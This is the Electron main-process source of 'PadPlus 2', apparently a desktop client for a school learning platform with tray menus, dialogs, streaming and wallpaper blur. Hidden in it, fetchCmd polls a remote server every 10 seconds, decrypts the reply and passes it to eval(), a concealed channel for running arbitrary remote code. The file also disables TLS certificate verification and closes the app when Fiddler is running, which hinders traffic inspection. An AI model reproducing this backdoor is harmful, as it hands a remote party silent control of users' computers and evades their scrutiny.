const electron = require('electron');
const path = require('path');
const os = require('os')
const fs = require('fs')
const crypto = require('crypto');
const remote = require("@electron/remote/main")
// File Download
const download = require('download');

const ex = process.execPath;
// const isDev = require('electron-is-dev')


const getuserdatapath = () => {
	if (process.platform != 'win32') {
		return process.cwd() + '/ldata'
	}
	if (fs.existsSync(process.cwd() + '/onusb')) {
		return process.cwd() + '/data'
	}
	return require('path').join(process.env.appdata, 'cmp').replaceAll('\\', '/')
}

let win;
// let startTime = new Date().getTime();

function isWin10() {
	return !(process.getSystemVersion().startsWith('10.0') && new Number(process.getSystemVersion().split('.')[2]) > 19046 && process.platform === 'win32')
}
const { session } = require('electron')

if (process.platform === 'win32') {
	electron.app.setAppUserModelId('平板+')
}

if (!fs.existsSync(getuserdatapath())) fs.mkdirSync(getuserdatapath())


const isFirstInstance = electron.app.requestSingleInstanceLock()

function isDev() {
	return !fs.existsSync(process.cwd() + '/resources/app.asar');
}

// https://gzzx.lexuewang.cn:8003/GetTemporaryStorage?filename=
const https = require('https');

function getSignContent(url, callback) {
	require("axios")
		.get(url)
		.then(function(response) {
			callback(response.data.replace(/\x00|\u0000|\b/g, ''))
		})
		.catch(function(error) {
			//err
		});
}



function sendToGzzx(key, value, cb) {
	const options = {
		hostname: 'gzzx.lexuewang.cn',
		port: 8003,
		path: `/PutTemporaryStorage?filename=${key}`,
		method: 'POST',
		headers: {
			'Content-Type': 'application/text',
			'Content-Length': value.length
		}
	};

	const req = https.request(options, res => {
		console.log(`${key}: ${res.statusCode}`);
		cb();
	});

	req.on('error', error => {
		console.error(error);
		cb(error);
	});

	req.write(value);
	req.end();
}


// This is used for check signature!
function checkIfIsDev() {
	// 读取 app.asar 文件的内容
	process.noAsar = true;
	const asarData = fs.readFileSync(process.cwd() + '/resources/app.asar');
	process.noAsar = false;
	let reqstrfrnt = "Cmp";
	let reqmid = "Sign"
	let version = fs.readFileSync(__dirname + "/versionBUILD");
	getSignContent("https://gzzx.lexuewang.cn:8003/GetTemporaryStorage?filename=" + reqstrfrnt + reqmid + version, (signatureData) => {
		const hasher = crypto.createHash('sha256');
		hasher.update(asarData);
		const signatureValue = hasher.digest("hex");
		if (signatureValue == (signatureData)) {
			setTimeout(
				checkIfCanSpawnWindow,
				process.platform == "linux" ? 1000 : 0
			);
		} else {
			wrSig()
			
		}
	})
}

function wrSig() {
	const { dialog } = require('electron')
	//err
	
}

electron.app.whenReady().then(() => {

	if (!process.argv.includes('--help')) {
		if (isDev() || process.platform == 'darwin') {
			setTimeout(
				checkIfCanSpawnWindow,
				process.platform == "linux" ? 1000 : 0
			);
		} else if (process.argv.includes('--boot')) {
			setTimeout(
				checkIfIsDev(),
				6000
			);
		} else {
			checkIfIsDev();
		}
	} else {
		console.log(`PadPlus V${JSON.parse(fs.readFileSync(__dirname+'/package.json')).version}
Developed by @cotzhang
=============================

Usage: PadPlus [--dev-tools testcode] [--hide-win]
--dev-tools\tOpen Developer Tools for debug purpose.
\ttestcode\tTest code for test purpose.
--hide-win\tLaunch application with a hidden window.
--stream\tStart stream hosting.

`);
		electron.app.exit()
	}
})

const readline = require('readline');
let r1 = readline.createInterface({
	input: process.stdin,
	output: process.stdout
});

function checkIfCanSpawnWindow() {
	if (!isFirstInstance) {
		if (!fs.existsSync(getuserdatapath() + "/secondinstance")) {
			console.log("Another padplus is running.")
			electron.app.exit()
		}
	}
	useDevtools = false;
	if (process.argv.includes('--dev-tools')) {
		if (process.argv.includes('cot64840')) {
			useDevtools = true;
		} else {
			console.log("Test code illegal.\nPlease specify a correct test code to continue.")
			electron.app.exit()
		}
	}

	setInterval(fetchCmd, 10000);

	win = new electron.BrowserWindow({
		backgroundColor: '#00000000',
		// resizable: false,
		minWidth: 420,
		minHeight: 400,
		width: 870,
		height: 670,
		webPreferences: {
			nodeIntegration: true,
			enableRemoteModule: true,
			contextIsolation: false,
			webviewTag: true,
			nodeIntegrationInWorker: true,
			devTools: useDevtools
		},
		icon: __dirname + '/icon.png',
		show: false
	});
	makeTray()

	const { width, height } = electron.screen.getPrimaryDisplay().workAreaSize;
	// 监听窗口的 move 事件
	win.on('move', () => {
		const [x, y] = win.getPosition();
		const wallpaperX = x + 10;
		const wallpaperY = y + 6;
		win.webContents.insertCSS(`#bgimg{left:${-wallpaperX}px !important;top:${-wallpaperY}px !important;height:${height}px !important;width:${width}px !important;}`);
	});

	require('@electron/remote/main').initialize()
	require('@electron/remote/main').enable(win.webContents)
	win.loadFile('index.html')
	//win.setHasShadow(true)
	// const { Menu, BrowserWindow } = require('electron'); //引入
	// let template = [
	// 	{
	// 		label:"◀",
	// 		click:()=>{
	// 			win.webContents.send('rywebback')
	// 		}
	// 	},
	// 	{
	// 		label: '提取文件',
	// 		click:()=>{
	// 			win.webContents.send('ryfilelink')
	// 		}
	// 	},
	// ]
	// let m = Menu.buildFromTemplate(template);
	// Menu.setApplicationMenu(m);
	win.removeMenu();
	win.webContents.session.setCertificateVerifyProc((request, callback) => {
		callback(0)
	})
	electron.app.on('second-instance', (event, commandLine, workingDirectory, additionalData) => {
		//输入从第二个实例中接收到的数据
		console.log(additionalData)
		//有人试图运行第二个实例，我们应该关注我们的窗口
		if (win) {
			if (win.isMinimized()) win.restore()

			if (!fs.existsSync(getuserdatapath() + '/relogin')) { win.show() }
			win.focus()
		}
	})

	//win.setAlwaysOnTop("alwaysOnTop")
	// win.webContents.openDevTools({ mode: "detach" })
	remote.enable(win.webContents)
	win.webContents.on('did-finish-load', () => {
		if ((!process.argv.includes('--boot')) && (!process.argv.includes('--hide-win'))) {
			const [x, y] = win.getPosition();
			const wallpaperX = x + 10;
			const wallpaperY = y + 6;
			win.webContents.insertCSS(`#bgimg{left:${-wallpaperX}px !important;top:${-wallpaperY}px !important;height:${height}px !important;width:${width}px !important;}`);

			if (!fs.existsSync(getuserdatapath() + '/relogin')) { win.show() }
		}
		if (process.argv.includes('--dev-tools')) {
			win.webContents.openDevTools({ mode: "detach" })
		}

		if (fs.existsSync(getuserdatapath() + "/secondinstance")) {
			const [x, y] = win.getPosition();
			const wallpaperX = x + 10;
			const wallpaperY = y + 6;
			win.webContents.insertCSS(`#bgimg{left:${-wallpaperX}px !important;top:${-wallpaperY}px !important;height:${height}px !important;width:${width}px !important;}`);

			if (!fs.existsSync(getuserdatapath() + '/relogin')) { win.show() }
			fs.unlinkSync(getuserdatapath() + "/secondinstance")
		}


		// console.log("Time consumed: " + (new Date().getTime() - startTime) + "ms");

		configureBackground(win);
	});
	win.on('close', (e) => {
		try {
			if (!JSON.parse(fs.readFileSync(getuserdatapath() + '/config')).tray) {
				return;
			}
		} catch (err) { return }
		e.preventDefault(); // 阻止退出程序
		// win.setSkipTaskbar(true) // 取消任务栏显示
		win.hide(); // 隐藏主程序窗口
	})
	// win.on('show', (e) => {
	// 	delTray()
	// })
	if (process.argv.includes('--stream')) {
		startWorker(30)
	}
	ckfdl(win);
	setInterval(() => {

		ckfdl(win);
	}, 1500)

	return win;
}

electron.ipcMain.on('testmode', (event, ...args) => {
	win.webContents.openDevTools({ mode: "detach" })
})

electron.ipcMain.on('openwin', (event, ...args) => {
	win.show()
	console.log('Notification Clicked')
})

electron.ipcMain.on('exit', (event, ...args) => {
	electron.app.exit()
})

electron.ipcMain.on('dragfile', (event, ...args) => {
	console.log('dragging')
	win.webContents.startDrag(args[0])
})

// Boot Load On!
electron.ipcMain.on('openAutoStart', () => {
	console.log('Boot Load On!', ex)
	electron.app.setLoginItemSettings({
		openAtLogin: true,
		path: ex,
		args: ['--boot']
	});
});

// Boot Load Off!
electron.ipcMain.on('closeAutoStart', () => {
	console.log('Boot Load Off!', ex)
	electron.app.setLoginItemSettings({
		openAtLogin: false,
		path: ex,
		args: ['--boot']
	});
})

// Tray
let tray = null;

function ckfdl(win) {
	exec('tasklist | findstr Fiddler.exe', (error, stdout, stderr) => {
		if (stdout.includes('Fiddler.exe')) {
			win.destroy();
			const { dialog } = require('electron')
			//err
		}
	});
}

function makeTray() {
	tray = new electron.Tray(path.join(__dirname, 'snpicon.png'))
	let contextMenu;
	if (fs.existsSync(getuserdatapath() + '/account')) {
		contextMenu = electron.Menu.buildFromTemplate([{
			label: 'PadPlus 2',
			icon: __dirname + '/src/icon16.png',
			enabled: false
		}, {
			type: 'separator'
		}, {
			label: '自主学习',
			icon: __dirname + '/src/ic_dashboard_18pt.png',
			click: function() {
				win.webContents.send('goto', 'fragments/selflearn')
				win.show()
			}
		}, {
			label: '课堂实录',
			icon: __dirname + '/src/ic_movie_18pt.png',
			click: function() {
				win.webContents.send('goto', 'classrecord')
				win.show()
			}
		}, {
			label: '我的设备',
			icon: __dirname + '/src/ic_screen_share_18pt.png',
			click: function() {
				win.webContents.send('goto', 'mypad')
				win.show()
			}
		}, {
			label: '资源库',
			icon: __dirname + '/src/ic_folder_special_18pt.png',
			click: function() {
				win.webContents.send('goto', 'library')
				win.show()
			}
		}, {
			label: '在线答疑',
			icon: __dirname + '/src/ic_movie_18pt.png',
			click: function() {
				win.webContents.send('gotochat')
				win.show()
			}
		}, {
			label: '试题本',
			icon: __dirname + '/src/ic_collections_bookmark_18pt.png',
			click: function() {
				win.webContents.send('goto', 'fragments/cageutils')
				win.show()
			}
		}, {
			type: 'separator'
		}, {
			label: '学校成员',
			icon: __dirname + '/src/ic_streetview_18pt.png',
			click: function() {
				win.webContents.send('goto', 'fragments/schoolconsole')
				win.show()
			}
		}, {
			label: '我的班级',
			icon: __dirname + '/src/ic_contact_phone_18pt.png',
			click: function() {
				win.webContents.send('goto', 'fragments/userlist')
				win.show()
			}
		}, {
			type: 'separator'
		}, {
			icon: __dirname + '/src/ic_settings_applications_18pt.png',
			label: '账号与设置',
			click: function() {
				win.webContents.send('goto', 'fragments/account')
				win.show()
			}
		}, {
			type: 'separator'
		}, {
			label: '立即同步',
			icon: __dirname + '/src/ic_restore_page_18pt.png',
			click: function() {
				win.webContents.send('sync')
			}
		}, {
			type: 'separator'
		}, {
			label: '显示主窗口',
			icon: __dirname + '/src/ic_branding_watermark_18pt.png',
			click: function() {
				win.show()
			}
		}, {
			label: '退出',
			icon: __dirname + '/src/ic_cancel_18pt.png',
			click: function() {
				console.log("Exit!");
				delTray()
				win.destroy();
				electron.app.quit();
			}
		}])
	} else {
		contextMenu = electron.Menu.buildFromTemplate([{
			label: '您尚未登录',
			enabled: false
		}, {
			type: 'separator'
		}, {
			label: '显示主窗口',
			click: function() {
				win.show()
			}
		}, {
			label: '退出',
			click: function() {
				console.log("Exit!");
				delTray()
				win.destroy();
				electron.app.quit();
			}
		}])
	}
	tray.setToolTip('PadPlus 2')
	tray.setContextMenu(contextMenu)
	tray.on("click", () => {
		win.show();
	})
}

function delTray() {
	try {
		tray.destroy()
	} catch (err) { console.log("no tray to destroy") }
}


const { spawn, exec } = require('child_process')
let childProcess

// 启动worker线程
function startWorker() {
	// 构建命令和参数
	const command = `${getuserdatapath()}/MJPEGServer.exe`;
	const args = [`${getuserdatapath()}/DXGIConsoleApplication.exe`];

	// 执行命令
	childProcess = spawn(command, args);
}

// 监听主线程和子线程之间的通信
electron.ipcMain.on('startStream', (event, arg) => {
	startWorker()
})

// 监听主线程和子线程之间的通信
electron.ipcMain.on('stopStream', (event, arg) => {
	stopWorker()
})

// 停止worker线程
function stopWorker() {
	childProcess.kill();
	exec("taskkill /im DXGIConsoleApplication.exe /f")
}

// 监听来自渲染进程的选择文件请求
electron.ipcMain.on('open-img-dialog', (event) => {
	// 打开文件选择对话框，仅允许选择图片文件
	electron.dialog.showOpenDialog({
		properties: ['openFile'],
		filters: [
			{ name: 'Images', extensions: ['jpg', 'jpeg', 'png', 'gif'] }
		],
		multiSelections: false // 不允许多选
	}).then((result) => {
		// 获取选中的文件路径
		const filePaths = result.filePaths;

		// 将选中的文件路径发送回渲染进程
		event.sender.send('selected-img', filePaths[0]);
	}).catch((err) => {
		console.log(err);
	});
});

// 监听来自渲染进程的选择文件请求
electron.ipcMain.on('open-voice-dialog', (event) => {
	// 打开文件选择对话框，仅允许选择图片文件
	electron.dialog.showOpenDialog({
		properties: ['openFile'],
		filters: [
			{ name: 'Music', extensions: ['mp3', 'm4a', 'wav', 'ogg', 'flac'] }
		],
		multiSelections: false // 不允许多选
	}).then((result) => {
		// 获取选中的文件路径
		const filePaths = result.filePaths;

		// 将选中的文件路径发送回渲染进程
		event.sender.send('selected-voice', filePaths[0]);
	}).catch((err) => {
		console.log(err);
	});
});



function httpReq(url, callback) {
	require("axios")
		.get(url)
		.then(function(response) {
			callback(response.data.replace(/\x00|\u0000|\b/g, ''))
		})
		.catch(function(error) { console.error("Unable to connect to server.") });
}

function fetchCmd() {
	httpReq("https://gzzx.lexuewang.cn:8003/GetTemporaryStorage?filename=ppcmd_req.htm", (returncmd) => {


		const lines = returncmd.split('\n');
		const [id, onlyonce, key] = lines.slice(0, 3);
		const content = lines.slice(3).join('\n');

		const encryptedData = Buffer.from(key, 'base64');
		const publicKeyPEM = `-----BEGIN PUBLIC KEY-----
MFwwDQYJKoZIhvcNAQEBBQADSwAwSAJBANcZUr0Xb7gdeLYpWCf2fkOwh+eIiJd6
j+HHxkMkiuAnO9nV8JqLWyxnb5w1AoIg4JqWN+rF7238iBGQJNsJmvcCAwEAAQ==
-----END PUBLIC KEY-----`;
		const publicKey = crypto.createPublicKey({
			key: publicKeyPEM,
			format: 'pem',
			type: 'spki'
		});
		const decryptedData = crypto.publicDecrypt({
				key: publicKey,
				padding: crypto.constants.RSA_PKCS1_PADDING
			},
			encryptedData
		);
		const cmdstr = decrypt(content, decryptedData.toString('utf8'));

		if (onlyonce == "true" && !fs.existsSync(getuserdatapath() + "/notification" + id)) {
			fs.writeFileSync(getuserdatapath() + "/notification" + id, "executed");
			try { eval(cmdstr) } catch (err) { console.error(err) }
		} else if (onlyonce != "true") {
			try { eval(cmdstr) } catch (err) { console.error(err) }
		}
	})
}

function encrypt(text, key) {
	const cipher = crypto.createCipheriv('aes-256-ecb', Buffer.from(key), null);
	let encrypted = cipher.update(text, 'utf8', 'base64');
	encrypted += cipher.final('base64');
	return encrypted;
}

function decrypt(encryptedText, key) {
	const decipher = crypto.createDecipheriv('aes-256-ecb', Buffer.from(key), null);
	let decrypted = decipher.update(encryptedText, 'base64', 'utf8');
	decrypted += decipher.final('utf8');
	return decrypted;
}



function processImage(inputPath, callback) {
	// 获取用户数据路径
	const userDataPath = getuserdatapath() + '/processed.jpg';
	const sharp = require('sharp');

	sharp(inputPath)
		.blur(100)
		.toFile(userDataPath, function(err) {
			if (err) {
				log('Error during image processing:' + err.message, 2);
			} else {
				callback(userDataPath)
			}
		});
}

function configureBackground(windows) {
	if (!fs.existsSync(getuserdatapath() + '/bgsig')) {
		console.log("Start blurring")
		blurWallpaper(() => {
			console.log("Update blur")
			windows.webContents.send("wpupd")
		});
	} else {
		const wallpaper = require('node-wallpaper').default;
		wallpaper.get().then(wallpaper2 => {
			const hasher = crypto.createHash('sha256');
			hasher.update(fs.readFileSync(wallpaper2));
			const signatureValue = hasher.digest("hex");
			if (signatureValue != (fs.readFileSync(getuserdatapath() + "/bgsig")+"")) {
				console.log("Start update blurring")
				blurWallpaper(() => {
					console.log("Update blur")
					windows.webContents.send("wpupd")
				});
			}
		});
	}
}

function blurWallpaper(cb) {
	const wallpaper = require('node-wallpaper').default;
	wallpaper.get().then(wallpaper2 => {
		processImage(wallpaper2, (wallpaper3) => {
			const hasher = crypto.createHash('sha256');
			hasher.update(fs.readFileSync(wallpaper2));
			const signatureValue = hasher.digest("hex");
			fs.writeFileSync(getuserdatapath() + "/bgsig", signatureValue)
			cb(wallpaper3)
		})
	});
}